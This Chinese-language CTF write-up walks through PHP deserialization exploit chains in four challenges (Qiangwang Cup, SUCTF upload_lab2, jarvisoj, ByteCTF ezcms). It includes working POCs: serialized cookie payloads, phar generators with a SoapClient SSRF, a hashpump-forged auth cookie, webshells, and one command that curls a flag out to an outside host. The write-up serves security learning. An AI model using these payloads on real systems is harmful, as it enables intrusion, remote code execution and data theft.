# 前言

总结最近在CTF练习中遇到的反序列化问题，个人觉得还蛮有意思的。从发现序列化可引发漏洞的位置，到如何触发序列化，再到打出一条完整的攻击链。



### 0001 `2019强网杯高明的黑客`

获取源码`www.tar.gz`后，直接审计代码,这是一个tp5的框架。

`./application/web/controller/Profile.php`函数`upload_img()`

```php
    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
               $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
               $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }
```

其中关键代码如下

```php
 if(getimagesize($this->filename_tmp)) {
     @copy($this->filename_tmp, $this->filename);
     @unlink($this->filename_tmp);}
```

只要我们能控制`upload_img()`，然后上传的一句话木马，将`filename`置为`php`后缀。就能`getshell`。

发现漏洞触发点后，我们再寻找该如何触发这个漏洞。在`Profile.php`中，有两个很显眼的魔术方法

```php
    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }
```

姑且先放着，我们先看看其他地方有没有什么线索。在`./application/web/controller/login.php`中有这样的函数

```php
public function login(){
        if($this->checker){
            if($this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
                $this->redirect($curr_url,302);
                exit();
            }
        }
        ...
        }
```

跟进函数`$this->checker->login_check()`

```php
    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }
```

这里的`$_COOKIE['user']`的反序列化操作可以将payload带入。

我们再看到`./application/web/controller/Register.php`

```php

class Register extends Controller
{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this->checker=new Index();
    }
.....
    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }
}
```

这里有一条攻击链

![](/home/cookie/Pictures/blogs/CTF中反序列化问题的学习/１.png)

这条攻击链的重点就来自于`__get()`和`___call()`这两个魔术方法的使用，说实话实在是神奇啊。

`POC`

```php
<?php

namespace app\web\controller;

class Register{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this->checker=new Profile();
    }

}

class Profile{
    public $checker;
    public $filename_tmp = "/var/www/html/public/upload/9e378836316a75e67168068366756335/364be8860e8d72b4358b5e88099a935a.png";
    public $filename = "/var/www/html/public/upload/9e378836316a75e67168068366756335/364be8860e8d72b4358b5e88099a935a.php";
    public $upload_menu = "upload_img";
    public $ext = "1";
    public $img;
    public $except = ["index" => "upload_menu"];
    //$except = array('index'=>'upload_img')
}

$clazz = new Register();

echo base64_encode(serialize($clazz));
?>
```

获得的密文后，我们先上传一个一句话木马图，然后重新登录，抓包修改cookie为我们的payload，登录后，刷新，访问就能看到我们的木马图被改成了一句话木马.......可我getshell后，死活找不到flag......

### 0002 `SUCTF2019 upload_lab2`

这道题它给了源码，这道题按作者的思路来，这里的考点还蛮有意思的.

[SUCTF 2019 出题笔记 & phar 反序列化的一些拓展](https://xz.aliyun.com/t/6057#toc-6)

```php
#index.php
<?php
include 'class.php';

$userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
if (!file_exists($userdir)) {
    mkdir($userdir, 0777, true);
}
if (isset($_POST["upload"])) {
    // 允许上传的图片后缀
    $allowedExts = array("gif", "jpeg", "jpg", "png");
    $tmp_name = $_FILES["file"]["tmp_name"];
    $file_name = $_FILES["file"]["name"];
    $temp = explode(".", $file_name);
    $extension = end($temp);
    if ((($_FILES["file"]["type"] == "image/gif")
            || ($_FILES["file"]["type"] == "image/jpeg")
            || ($_FILES["file"]["type"] == "image/png"))
        && ($_FILES["file"]["size"] < 204800)   // 小于 200 kb
        && in_array($extension, $allowedExts)
    ) {
        $c = new Check($tmp_name);
        $c->check();
        if ($_FILES["file"]["error"] > 0) {
            echo "错误：: " . $_FILES["file"]["error"] . "<br>";
            die();
        } else {
            move_uploaded_file($tmp_name, $userdir . "/" . md5($file_name) . "." . $extension);
            echo "文件存储在: " . $userdir . "/" . md5($file_name) . "." . $extension;
        }
    } else {
        echo "非法的文件格式";
    }
}

#class.php
<?php
include 'config.php';

class File{

    public $file_name;
    public $type;
    public $func = "Check";

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }

    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }

    function __toString(){
        return $this->type;
    }

}

class Check{

    public $file_name;

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function check(){
        $data = file_get_contents($this->file_name);
        if (mb_strpos($data, "<?") !== FALSE) {
            die("&lt;? in contents!");
        }
    }
}

#func.php
<?php
include 'class.php';

if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }else{
        $file_path = $_POST['url'];
        $file = new File($file_path);
        $file->getMIME();
        echo "<p>Your file type is '$file' </p>";
    }
}

?>
      
#admin.php
    <?php
include 'config.php';

class Ad{

    public $ip;
    public $port;

    public $clazz;
    public $func1;
    public $func2;
    public $func3;
    public $instance;
    public $arg1;
    public $arg2;
    public $arg3;

    function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){

        $this->ip = $ip;
        $this->port = $port;
        $this->clazz = $clazz;
        $this->func1 = $func1;
        $this->func2 = $func2;
        $this->func3 = $func3;
        $this->arg1 = $arg1;
        $this->arg2 = $arg2;
        $this->arg3 = $arg3;
    }

    function check(){

        $reflect = new ReflectionClass($this->clazz);
       
        $this->instance = $reflect->newInstanceArgs();

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);


        $reflectionMethod->invoke($this->instance, $this->arg1);
        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);


        $reflectionMethod->invoke($this->instance, $this->arg2);
        

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
        $reflectionMethod->invoke($this->instance, $this->arg3);
        
    }

    function __destruct(){
        system($this->cmd);
    }
}

if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
    if(isset($_POST['admin'])){

        $ip = $_POST['ip'];     
        $port = $_POST['port']; 
        $clazz = $_POST['clazz'];
        $func1 = $_POST['func1'];
        $func2 = $_POST['func2'];
        $func3 = $_POST['func3'];
        $arg1 = $_POST['arg1'];
        $arg2 = $_POST['arg2'];
        $arg2 = $_POST['arg3'];
        $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
        $admin->check();
    }
}
else {
    echo "You r not admin!";
}
```

代码审计部分，我们从`index.php`入手，这里使用白名单过滤，那么这里我们就只能上传图片文件，没有发现其他可以利用的地方。上传图片后，它会返回一个路径，这里就先搁着，看看其他文件......

看到`func.php`接受一个`url`,返回我们所上传的图片的文件类型。

```php
if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }else{
        $file_path = $_POST['url'];
        $file = new File($file_path);
        $file->getMIME();
        echo "<p>Your file type is '$file' </p>";
    }
}
```

跟进`getMIME()`函数

```php
    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }
```

这里的`finfo_file()`可以触发`phar反序列化漏洞`。

`getIMIME()`是File类的方法，在File类中有一个很可疑的方法，就是`__wakeup()`

```php
    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }
```

考察ssrf的地方到了.....admin.php仅内网可访问，这里使用SoapClient类发起一个访问

```php
//admin.php    
    function __destruct(){
        system($this->cmd);
    }
```

这里可以带出flag。

附上POC

```php
<?php
class File{
    public $file_name;
    public $type;
    public $func = "SoapClient";
    function __construct($file_name){
        $this->file_name = $file_name;
    }
}
$target = 'http://127.0.0.1/admin.php';
// $target = "http://106.14.153.173:2015";
//$post_string = 'admin=1&&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=xxx.xxx.xxx.xxx&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3306&func3=query&arg3=select%201&ip=xxx.xxx.xxx.xxx&port=xxxx';
$post_string ='admin=1&cmd=curl http://6fe82b486986/`/readflag`&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3=123456'. "\r\n";

$headers = array(
    'X-Forwarded-For: 127.0.0.1',
);
// $b = new SoapClient(null,array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));
$arr = array(null, array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));
$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
// <?php __HALT_COMPILER();
$phar->setStub("GIF89a" . "< language='php'>__HALT_COMPILER();</>"); //设置stub
$o = new File($arr);
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");
//签名自动计算
$phar->stopBuffering();
rename("1.phar", "9.gif");
?>
```

生成一个文件，上传后，为绕过其协议限制，我们使用php://filter伪协仪来绕过

```php
php://filter/read=convert.base64-encode/resource=phar://./upload/xxx.gif
```

复现是在`BUUCTF`中进行的，然后我们得使用这个平台提供的内网靶机，使用curl带出flag。

### 0x03 jarvisoj

浙大的一道题，主要考察session反序列化，session.upload_progress.enabled的使用，这个我觉得算是一个小trick。

题目地址：[http://web.jarvisoj.com:32784/](http://web.jarvisoj.com:32784)

源码：

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

使用反序列化的话，一旦控制了`$mdzz`，我们们就可以通过`_destruct()`，进行文件读取。

![](/home/cookie/Pictures/blogs/11.png)

在php.ini中设置的是session处理器是`php_serialize`，然后在这道题中设置的session处理器又是`php`，这里的处理器差异导致反序列化漏洞。

[HP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)

[深入浅析PHP的session反序列化漏洞问题](https://www.jb51.net/article/116246.htm)

我们先构造payload

```php
<?php

class OowoO
{
    public $mdzz = "var_dump(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));";
}

$m = new OowoO();
echo serialize($m);
//|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
//|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:89:\"var_dump(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));\";}
?>
```

然后我们构造的payload该如何进入session中，使其能够被`session处理器 php`处理。

![](/home/cookie/Pictures/blogs/12.png)

session.upload_progress.enable是开启的。**意味着当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。**



我觉得这个trick，我是想不到，因为对php.ini的配置还不是很熟.....

```
<!DOCTYPE html>
<html>
<head>
	<title>test XXE</title>
	<meta charset="utf-8">
</head>
<body>
	<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
	    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
	    <input type="file" name="file" />
	    <input type="submit" value="go" />
	</form>
</body>
</html>

```

我们POST一个表单，表单名为`PHP_SESSION_UPLOAD_PROGRESS`，然后我们就能将我们的payload带入`SESSION`

![](/home/cookie/Pictures/blogs/13.png)



### 0x04 ByteCTF ezcms

#### 第一部分

这道题考察hashpump，php反序列化(通过phar实现)

扫描目录获得源码，ｗｗｗ.zip，审计源码

```php
//index.php
<?php
error_reporting(0);
include('config.php');
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $username = urldecode($username);
    $password = urldecode($password);
    if ($password === "admin"){
        die("u r not admin !!!");
    }
    $_SESSION['username'] = $username;
    $_SESSION['password'] = $password;

    if (login()){
        echo '<script>location.href="upload.php";</script>';
    }
}
```

跟进login()函数：

```php
//config.php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;
}
```

生成一段`hash`，然后这里就用到了我们的hash拓展攻击，可以看出这是一段８位的密文

burp抓包将会获取一段hash值，当我们登录后，到`upload.php`

```php
<?php
include ("config.php");
if (isset($_FILES['file'])){
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_name = $_FILES['file']['name'];
    $file_size = $_FILES['file']['size'];
    $file_error = $_FILES['file']['error'];
    if ($file_error > 0){
        die("something error");
    }
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
}else{
    $sandbox = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($sandbox)){
        mkdir($sandbox, 0777, true);
    }
    if (!is_file($sandbox.'/.htaccess')){
        file_put_contents($sandbox.'/.htaccess', 'lolololol, i control all');
    }
    echo "view my file : "."<br>";
    $path = "./".$sandbox;
    $dir = opendir($path);
    while (($filename = readdir($dir)) !== false){
        if ($filename != '.' && $filename != '..'){
            $files[] = $filename;
        }
    }
    foreach ($files as $k=>$v){
        $filepath = $path.'/'.$v;
        echo <<<EOF
        <div style="width: 1000px; height: 30px;">
        <Ariel>filename: {$v}</Ariel>
        <a href="view.php?filename={$v}&filepath={$filepath}">view detail</a>
</div>
EOF;
    }
    closedir($dir);

}
```

关键函数：

```php
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
```



看到`Admin`类:

```php
 $this->checker = $profile->is_admin();
 ...
 //Profile类
 public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

  }
```



这里的关键代码：

```php
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
```

上传文件时得是admin才能上传文件，验证的方式是通过`$_COOKIE['user']`和`md5($secret.$this->username.$this->password)`进行验证，这两个东西，我们可以通过hash拓展进行伪造

```
hashpump -s "52107b08c0f3342d2153ae1d68e6262c" -d adminadmin -k 8 -a admin123
$_COOKIE['user']:da87617c23790ab325af3e593dbc093c
username:admin
password:admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00admin123

admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin123
```

然后登录，上传文件时得记得带上$_COOKIE['user']，这样就能上传文件了。



#### 第二部分

当我们在访问upload.php时将会生成一个.htaccess文件。由于这个文件里面的内容被服务器写死了，所以我们上传的马无法被正常地解析，所以我们要做的就是给.htaccess做手脚。

```php
//view.php
<?php
error_reporting(0);
include ("config.php");
$file_name = $_GET['filename'];
$file_path = $_GET['filepath'];
$file_name=urldecode($file_name);
$file_path=urldecode($file_path);
$file = new File($file_name, $file_path);
$res = $file->view_detail();
$mine = $res['mine'];
$store_path = $res['store_path'];
```

跟进view_detail()

```php
    public function view_detail(){
        if      (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath))
        {
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;
    }
```

这里的`mime_content_type()`函数将会触发phar引起的反序列化漏洞。

```php
class File{

    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
    ... ... 
    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }
}
```

这里的`$checker`是我们可控的。

```php
class Profile{

    public $username;
    public $password;
    public $admin;

    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

当调用该类中的一个不存在的函数时，将会触发`__call()`魔术方法，可奇怪的是这个类中并没有`open()`函数，考虑到可能内置类的函数。

参考链接：[https://www.php.net/manual/tr/function.ziparchive-open.php](https://www.php.net/manual/tr/function.ziparchive-open.php)

<img src="/home/cookie/Pictures/blogs/9.png" style="zoom:50%;" />

**ZIPARCHIVE::OVERWRITE** ([integer](https://www.php.net/manual/zh/language.types.integer.php))

总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。

所以我们可以通过设置$filename为`.htaccess`的路径，然后通过这个办法将其覆盖。

```php
<?php
class File
{
    public $filename;
    public $filepath;
    public $checker;
    function __construct()
    {
        $this->checker = new Profile();
    }
    function __destruct()
    {
        if (isset($this->checker)) {
            $this->checker->upload_file();
        }
    }
}
class Profile
{
    public $username;
    public $password;
    public $admin;
    function __construct()
    {
        $this->admin = new ZipArchive();
        $this->username = '/var/www/html/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/.htaccess';
        $this->password = ZIPARCHIVE::OVERWRITE;
    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
@unlink("test.phar");
$phar = new Phar("43.phar");
//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
//设置stub
$o = new File();
$phar->setMetadata($o);
//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");
//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

上传該phar文件。访问該文件。使得解除`.htaccess`被写乱的现状。

访问該链接，就是为了触发phar反序列化漏洞。

```
http://112.126.102.158:9999/view.php?filename=&filepath=php://filter/convert.base64-
encode/resource=phar://sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/dab4372519226a4dccef3b43f41200c1.phar
```

使用`filter://`是为了绕过黑名单



接着上传木马

```php
<?php
var_dump(file_get_contents("/flag"));
?>
```



访问链接：

```
http://112.126.102.158:9999/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/71c31cca71459cafdb161a3f63a6fdc7.php
```

获得flag

![](/home/cookie/Pictures/blogs/10.png)

整个攻击链如下：

![](/home/cookie/Pictures/blogs/2019ByteCTF[复现]/１.png)

